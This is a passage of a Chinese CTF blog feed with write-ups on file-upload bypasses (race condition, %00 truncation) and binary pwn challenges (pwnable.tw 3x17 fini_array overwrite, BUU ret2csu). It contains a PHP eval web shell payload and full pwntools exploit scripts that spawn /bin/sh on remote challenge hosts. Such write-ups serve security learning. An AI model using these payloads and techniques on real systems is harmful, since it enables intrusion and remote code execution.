invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p>&#x3D;&#x3D;Pass-18&#x3D;&#x3D;</p>
<p>查看提示需要代码审计</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131913099.png" alt="image-20241018220600826" style="zoom:50%;" />

<p>​	使用<code>move_uploaded_file()</code>函数，将上传的文件保存到服务器，再进行判断是否是<code>jpg、png、gif</code>中的一种类型，如果在数组中就保存重命名，如果不在根据<code>unlink()</code>就直接删除</p>
<p>​	代码他是先将图片上传上去，才开始进行判断后缀名、二次渲染。如果在上传上去的一瞬间访问这个文件，那他就不能对这个文件删除、二次渲染。这就相当于我们打开了一个文件，然后再去删除这个文件，就会提示这个文件在另一程序中打开无法删除。</p>
<p><strong>通关步骤：</strong></p>
<p>上传<code>&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;</code>然后<code>bp</code>拦截，发送到<code>Intruder</code></p>
<p>设置<code>payload</code>类型</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131912203.png" alt="image-20241018220215886" style="zoom:50%;" />

<p>增多线程数</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131912712.png" alt="image-20241018220239756" style="zoom:50%;" />

<p>开始攻击，然后运行脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://172.20.10.10/uploads/upload/1.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="%00截断绕过"></a><code>%00</code>截断绕过</h2><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131912556.png" alt="image-20241018230053056" style="zoom:50%;" />

<ul>
<li>黑名单中没有过滤<code>PHP</code>，因此可以利用大写绕过</li>
<li>通过<code>move_upload_file()</code>函数移动文件<ul>
<li>因此可以修改后缀为<code>php/.</code>，<code>php/.</code>可以绕过黑名单，<code>move_upload_file()</code>函数会删除末尾的<code>/.</code></li>
<li>或者利用<code>%00</code>截断绕过</li>
</ul>
</li>
<li><code>$file_name</code>是通过<code>POST</code>传参获取的，<code>bp</code>抓包修改应<code>POST</code>参数后缀为<code>PHP</code></li>
</ul>
<p>最后再介绍一下<code>%00</code>截断绕过的方法</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131911620.png" alt="image-20241018232435030"></p>
<p>发送上传成功后，打开图像链接</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131911041.png" alt="image-20241018232615034" style="zoom:50%;" />

<p>成功解析脚本</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131911844.png" alt="image-20241018232640959" style="zoom:50%;" />
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw writeup-3x17</title>
    <url>/2024/07/12/writeup-3x17/</url>
    <content><![CDATA[<h3 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h3><ol>
<li><p><code>ida</code>中，交叉引用<code>X</code>，对函数进行重命名<code>N</code>。</p>
</li>
<li><p>程序最开始执行的是<code>start</code>函数，<code>start</code>调用<code>__libc_start_main</code>函数，然后程序执行<code>__libc_csu_init</code>函数，接着才执行<code>main</code>函数，最后执行<code>__libc_csu_fini</code>函数。<code>__libc_start_main</code>的函数原型是<code>__libc_start_main(main,argc,ubp_av,init,fini,rtld_fini)</code>。</p>
<span id="more"></span>
</li>
<li><p>在<code>__libc_csu_init</code>函数中程序会执行<code>_init,__init_array[0],__init_array[1]...__init_array[n]</code>，在<code>__libc_csu_fini</code>函数中程序会执行<code>__fini_array[n]...__fini_array[1],__fini_array[0],_fini</code>。</p>
</li>
</ol>
<h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202227301.png" alt="1"></p>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><h4 id="寻找-main-函数"><a href="#寻找-main-函数" class="headerlink" title="寻找_main_函数"></a>寻找_main_函数</h4><p>静态链接的程序，函数名符号表都被去除了，我们可以通过以下两种方法寻找<em>main</em>函数</p>
<p>运行程序可以发现关键字符串<em>addr:<em>，在</em>ida</em>中双击<em>addr:</em></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202227737.png" alt="2"></p>
<p>然后点击<em>buf</em>，并进行交叉引用<code>X</code>，如图<code>0x401B6D</code>就是<em>main</em>函数的地址</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202227710.png" alt="3"></p>
<p>第二种方法其实就是去探究<em>main</em>是怎么出现的。</p>
<p>首先通过命令<code>readelf -h 3x17</code>，我们可以查看程序的人口地址，如图是<code>0x401a50</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202227397.png" alt="4"></p>
<p>可以用<code>G</code>，在<em>ida</em>中搜索地址，发现就是<em>start</em>函数的地址，故程序运行的第一个函数其实是<em>start</em>函数</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202228584.png" alt="5"></p>
<p>将一个正常的程序的<em>start</em>函数，与该程序的<em>start</em>函数对比，可以发现二者几乎完全相同</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202228194.png" alt="6"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public start</span><br><span class="line">start proc near</span><br><span class="line">; __unwind &#123;</span><br><span class="line">xor     ebp, ebp</span><br><span class="line">mov     r9, rdx  ;rtld_fini</span><br><span class="line">pop     rsi  ;argc</span><br><span class="line">mov     rdx, rsp  ;ubp_av</span><br><span class="line">and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">push    rax</span><br><span class="line">push    rsp  ;stack_end</span><br><span class="line">mov     r8, offset sub_402960  ;fini</span><br><span class="line">mov     rcx, offset sub_4028D0  ;init</span><br><span class="line">mov     rdi, offset sub_401B6D  ;main</span><br><span class="line">db      67h</span><br><span class="line">call    sub_401EB0  ;__libc_start_main</span><br><span class="line">hlt</span><br><span class="line">; &#125; // starts at 401A50</span><br><span class="line">start endp</span><br></pre></td></tr></table></figure>

<p>所以*__libc_start_main<em>函数的原型如下，与此同时我们也就找到了</em>main*函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__libc_start_main(main,argc,ubp_av,init,fini,rtld_fini)</span><br><span class="line"><span class="comment">//这里说一下64位程序函数传参寄存器依次为：rdi,rsi,rdx,rcx,r8,r9,r10</span></span><br></pre></td></tr></table></figure>

<p>最后我们可以用<code>N</code>，在<em>ida</em>中对函数进行重命名</p>
<h4 id="分析-libc-csu-fini-函数"><a href="#分析-libc-csu-fini-函数" class="headerlink" title="分析___libc_csu_fini_函数"></a>分析___libc_csu_fini_函数</h4><p>下面是*__libc_csu_fini*函数的汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000402960 fini            proc near               ; DATA XREF: start+F↑o</span><br><span class="line">.text:0000000000402960 ; __unwind &#123;</span><br><span class="line">.text:0000000000402960                 push    rbp</span><br><span class="line">.text:0000000000402961                 lea     rax, unk_4B4100 </span><br><span class="line">.text:0000000000402968                 lea     rbp, off_4B40F0  #__fini_array</span><br><span class="line">.text:000000000040296F                 push    rbx</span><br><span class="line">.text:0000000000402970                 sub     rax, rbp</span><br><span class="line">.text:0000000000402973                 sub     rsp, 8</span><br><span class="line">.text:0000000000402977                 sar     rax, 3</span><br><span class="line">.text:000000000040297B                 jz      short loc_402996</span><br><span class="line">.text:000000000040297D                 lea     rbx, [rax-1]</span><br><span class="line">.text:0000000000402981                 nop     dword ptr [rax+00000000h]</span><br><span class="line">.text:0000000000402988</span><br><span class="line">.text:0000000000402988 loc_402988:                             ; CODE XREF: fini+34↓j</span><br><span class="line">.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]  ;</span><br><span class="line">.text:000000000040298C                 sub     rbx, 1</span><br><span class="line">.text:0000000000402990                 cmp     rbx, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">.text:0000000000402994                 jnz     short loc_402988</span><br><span class="line">.text:0000000000402996</span><br><span class="line">.text:0000000000402996 loc_402996:                             ; CODE XREF: fini+1B↑j</span><br><span class="line">.text:0000000000402996                 add     rsp, 8</span><br><span class="line">.text:000000000040299A                 pop     rbx</span><br><span class="line">.text:000000000040299B                 pop     rbp</span><br><span class="line">.text:000000000040299C                 jmp     _term_proc</span><br><span class="line">.text:000000000040299C ; &#125; // starts at 402960</span><br><span class="line">.text:000000000040299C fini            endp</span><br></pre></td></tr></table></figure>

<p>​	<em>__fini_array</em>是一个数组，<code>0x4b40f0</code>是*__fini_array<em>的首地址，在</em>gdb<em>调试的过程中，发现<code>__libc_csu_fini</code>这个函数其实就是先调用</em>__fini_array[1]<em>，再执行</em>__fini_array[0]*。</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	运行程序后程序让我们先输入一个地址，再输入数据，漏洞点可能是任意地址改写。而我们又知道*__libc_csu_fini<em>函数会先执行</em>__fini_array[1]<em>，再执行</em>__fini_array[0]<em>，所以如果我们把</em>main<em>函数地址写到</em>__fini_array[1]*中，程序是不是就会一直循环写入内容。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&quot;addr:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x4b40f8</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;data:&quot;</span>,p64(<span class="number">0x401b6d</span>))</span><br></pre></td></tr></table></figure>

<p>试了一下后发现这样不行，后来发现还要把*__libc_csu_fini<em>函数写到</em>__fini_array[0]*中，如图，这样就可以一直循环写了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&quot;addr:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x4b40f0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;data:&quot;</span>,p64(<span class="number">0x401b6d</span>)+p64(<span class="number">0x402960</span>))</span><br><span class="line"><span class="comment">#程序会先把main写到__fini_array[0]，再把0x402960写到__fini_array[0]的下一个内存单元，即__fini_array[1]中</span></span><br></pre></td></tr></table></figure>

<p>由于读入有字数限制，所以只能通过多次任意地址写在*__fini_array+0x10<em>布置我们构造的</em>rop<em>链，然后我们再通过栈迁移，将栈迁移到_fini_array+0x10_上，去执行</em>ROP*链。</p>
<p>还有一点，一开始我以<code>p64()</code>形式发送<em>addr</em>的时候，第二次读入<em>read</em>函数的<em>rdi</em>总是为<code>0</code>，但是以<code>str()</code>形式发送后就没问题了。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./3x17&#x27;)</span></span><br><span class="line"><span class="comment"># context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10105</span>)</span><br><span class="line"><span class="comment"># debug(p,0x402960,0x401BDC,0x401C29,0x401C13)</span></span><br><span class="line">debug(p,<span class="number">0x401bdc</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401696</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000406c30</span></span><br><span class="line">pop_rdx = <span class="number">0x0000000000446e35</span></span><br><span class="line">pop_rax = <span class="number">0x000000000041e4af</span></span><br><span class="line">syscall = <span class="number">0x00000000004022b4</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000401c4b</span></span><br><span class="line">ret = <span class="number">0x0000000000401016</span></span><br><span class="line">fini_array0 = <span class="number">0x4b40f0</span></span><br><span class="line">fini_array1 = <span class="number">0x4b40f8</span></span><br><span class="line">main = <span class="number">0x401b6d</span></span><br><span class="line">fini = <span class="number">0x402960</span></span><br><span class="line">bss = <span class="number">0x4B94A0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">addr,data</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;addr:&quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line">    p.sendafter(<span class="string">&quot;data:&quot;</span>,data)</span><br><span class="line">payload = p64(pop_rdi)+p64(bss)+p64(pop_rsi)</span><br><span class="line">payload1 = p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0</span>)</span><br><span class="line">payload2 = p64(pop_rax)+p64(<span class="number">0x3b</span>)+p64(syscall)</span><br><span class="line"></span><br><span class="line">attack(fini_array0,p64(fini)+p64(main))</span><br><span class="line">attack(bss,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">attack(fini_array0+<span class="number">0x10</span>,payload)</span><br><span class="line">attack(fini_array0+<span class="number">0x28</span>,payload1)</span><br><span class="line">attack(fini_array0+<span class="number">0x40</span>,payload2)</span><br><span class="line">attack(fini_array0,p64(leave_ret)+p64(ret))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<em>flag</em></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202228754.png" alt="7"></p>
]]></content>
      <categories>
        <category>pwnable.tw刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>关于ret2csu的一道题</title>
    <url>/2024/07/10/%E5%85%B3%E4%BA%8Eret2csu%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/</url>
    <content><![CDATA[<p><code>BUU</code>：<code>ciscn_2019_s_3</code></p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>检查保护，开了<code>NX</code>保护</p>
<span id="more"></span>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101108593.png" alt="image-20240223192404259"></p>
<p>源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = sys_read(<span class="number">0</span>, buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> sys_write(<span class="number">1u</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	程序中有两个系统调用，<code>read</code>可栈溢出，程序中没有后门函数。但是我们看到了下面这个，<code>3bh</code>是<code>64</code>位程序<code>execve</code>的系统调用号，程序中有系统调用则肯定有<code>syscall</code>即我们可以利用<code>gadgets</code>布置<code>execve</code>的参数，然后<code>syscall</code>获得<code>shell</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101109280.png" alt="image-20240223193124425"></p>
<p>​	系统调用<code>execve</code>，我们必须要知道<code>/bin/sh</code>的地址。本题中，<code>buf</code>的长度为<code>16</code>个字节，而<code>write</code>打印<code>0x30</code>个字节，又因为<code>buf</code>在栈上，所以<code>buf</code>下面的一些栈中的数据也会被打印出来。</p>
<p>​	我们填满<code>buf</code>的<code>16</code>个字节，然后发送<code>vuln</code>函数的第一个指令的地址，执行流会重新执行一遍<code>vuln</code>函数。发送<code>payload = b&#39;/bin/sh\x00&#39;+b&#39;a&#39;*8+p64(vuln_addr)</code>，然后看栈中的内容，其中<code>0x7ffd3e0cdce8</code>是栈地址同时也能被泄漏。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101109881.png" alt="image-20240223220610682"></p>
<p><code>payload</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_02_content = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack_02_content  -----&gt; &#x27;</span>,<span class="built_in">hex</span>(stack_02_content))</span><br><span class="line">binsh_addr = stack_02_content-<span class="number">0x148</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr  -----&gt; &#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br></pre></td></tr></table></figure>

<p>​	接下来就是传参，不过我们没有直接找到<code>rdx</code>相关的<code>gadget</code>地址，好吧，其实这就是道关于<code>ret2csu</code>类型的题。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101110328.png" alt="image-20240710111035299" style="zoom:80%;" />

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101111199.png" alt="image-20240710111108172" style="zoom:80%;" />

<p>​	下面是<code>csu</code>片段，我们就是要利用这两个片段，对寄存器进行各种操作，最后使<code>rdx</code>中的值为<code>0</code>（<code>execve</code>的第<code>3</code>个参数）。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101111960.png" alt="image-20240223193956921"></p>
<p>​	<code>csu</code>②都是一些<code>pop</code>，重要的是怎么绕过<code>csu</code>①，首先我们要弄懂<code>csu</code>①中的汇编代码是什么意思。其中，<code>call</code>指令是调用函数，这里的<code>[]</code>是间接寻址，<code>call  [r12+rbx*8]</code>这个指令的意思是调用一个函数，这个函数在哪，这个函数的地址在<code>r12+rbx*8</code>这个地址里装着。也就是说，如果<code>r12</code>和<code>rbx</code>的值分别为<code>0x123456</code>和<code>0</code>，<code>0x123456</code>又指向<code>0x400123</code>这个地址，那么我们要调用的函数的地址不是<code>0x123456</code>而是<code>0x400123</code>。</p>
<p>​	<code>cmp</code>指令用于比较两个操作数的值，<code>cmp  rbx,rbp</code>指令的意思是比较<code>rbx</code>和<code>rbp</code>这两个寄存器的值。如果<code>rbx</code>和<code>rbp</code>的值不相等，那么<code>jnz</code>会跳转到相应的地址执行，反之执行流继续执行下一条指令。</p>
<p><code>payload</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">csu1_addr = <span class="number">0x400580</span></span><br><span class="line">csu2_addr = <span class="number">0x40059a</span></span><br><span class="line">term_proc_lastone_addr = <span class="number">0x600e50</span></span><br><span class="line"></span><br><span class="line">payload = p64(csu2_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(term_proc_lastone_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#                           rbx    rbp        r12                     r13   r14     r15</span></span><br><span class="line">payload += p64(csu1_addr)</span><br></pre></td></tr></table></figure>

<p>​	我们在<code>ida</code>中看到<code>term_proc</code>是一个空函数，其地址为<code>0x4005b4</code>，当然这个肯定不是我们想要的，我们想要的是哪个地址指向<code>0x4005b4</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101112897.png" alt="image-20240223200400679"></p>
<p>在<code>gdb</code>中，我们利用<code>search -p 0x4005b4</code>这个命令看到<code>0x600e50</code>这个地址中装的是<code>0x4005b4</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101112143.png" alt="image-20240223200329635"></p>
<p>​	一开始按照上面的<code>payload</code>发送一直打不通，调试的时候发现，调用完这个空函数后会<code>ret</code>到返回地址<code>0x40058d</code>也就是<code>csu</code>①中的<code>add     rbx, 1</code>指令，后面会影响栈的有<code>add   rsp,8</code>和<code>6</code>个<code>pop</code>指令，所以我们还需要再发送<code>7*8</code>个垃圾数据。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101112790.png" alt="image-20240224101044851"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101113922.png" alt="image-20240224101247650"></p>
<p>修改后<code>payload</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">csu1_addr = <span class="number">0x400580</span></span><br><span class="line">csu2_addr = <span class="number">0x40059a</span></span><br><span class="line">term_proc_lastone_addr = <span class="number">0x600e50</span></span><br><span class="line">payload = p64(csu2_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(term_proc_lastone_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(csu1_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400501</span></span><br><span class="line">mov_rax_addr = <span class="number">0x4004e2</span></span><br><span class="line">payload += p64(mov_rax_addr)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(syscall_addr)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./s3&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28982</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_02_content = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack_02_content  -----&gt; &#x27;</span>,<span class="built_in">hex</span>(stack_02_content))</span><br><span class="line">binsh_addr = stack_02_content-<span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr  -----&gt; &#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">csu1_addr = <span class="number">0x400580</span></span><br><span class="line">csu2_addr = <span class="number">0x40059a</span></span><br><span class="line">term_proc_lastone_addr = <span class="number">0x600e50</span></span><br><span class="line">payload += p64(csu2_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(term_proc_lastone_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(csu1_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line"></span><br><span class="line">pop_rdi_addr = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400501</span></span><br><span class="line">mov_rax_addr = <span class="number">0x4004e2</span></span><br><span class="line">payload += p64(mov_rax_addr)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(syscall_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101113867.png" alt="image-20240122145901772"></p>
<h2 id="更换libc"><a href="#更换libc" class="headerlink" title="更换libc"></a>更换<code>libc</code></h2><p>​	本题中本地和远程的<code>libc</code>不一样，所以偏移量也不同，本题中本地的是<code>0x148</code>远程为<code>0x118</code>。我们可以利用<code>pathelf</code>和<code>glibc-all-in-one</code>更换本地依赖的<code>libc</code>。</p>
<p>​	首先用<code>strings ./libc-2.23.so | grep &quot;GNU&quot;</code>命令查看远程<code>libc</code>的<code>GLIBC</code>版本</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101114720.png" alt="image-20240224000900918"></p>
<p>然后在<code>glibc-all-in-one</code>中找到对应的版本号，<code>64</code>位程序对应<code>amd64</code>，<code>32</code>位程序对应<code>i386</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101114715.png" alt="image-20240224001212635"></p>
<p>执行<code>./download 2.23-0ubuntu11.3_amd64</code>，便会在<code>glibc-all-all-in-one</code>目录下的<code>libs</code>目录中生成一个新目录</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101114024.png" alt="image-20240224001750545"></p>
<p>最后便可利用<code>patchelf</code>中<code>--set-interpreter </code>和<code>--add-needed</code>选项分别设置链接器和依赖的路径即可。</p>
]]></content>
      <categories>
        <category>pwn学习总结</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>关于通过线程绕过沙箱的一道题</title>
    <url>/2024/07/10/%E4%B8%80%E9%81%93%E5%85%B3%E4%BA%8E%E9%80%9A%E8%BF%87%E7%BA%BF%E7%A8%8B%E7%BB%95%E8%BF%87%E6%B2%99%E7%AE%B1%E7%9A%84%E9%A2%98/</url>
    <content><![CDATA[<h2 id="thread-pwn"><a href="#thread-pwn" class="headerlink" title="thread_pwn"></a><em>thread_pwn</em></h2><h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101140929.png" alt="image-20240428181256065" style="zoom:80%;" />

<span id="more"></span>

<p>开了沙箱保护策略，程序中只允许出现<code>read,write,clock_nanosleep,exit_group</code>这些系统调用。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101141726.png" alt="image-20240428181336131" style="zoom:80%;" />

<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>程序创建了一个线程，在这个线程中调用<code>start_routine</code>函数</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101141777.png" alt="image-20240428184506061" style="zoom:80%;" />

<p>有一个栈溢出漏洞，可以溢出<code>0x10</code>个字节</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101141344.png" alt="image-20240427204331334" style="zoom:67%;" />

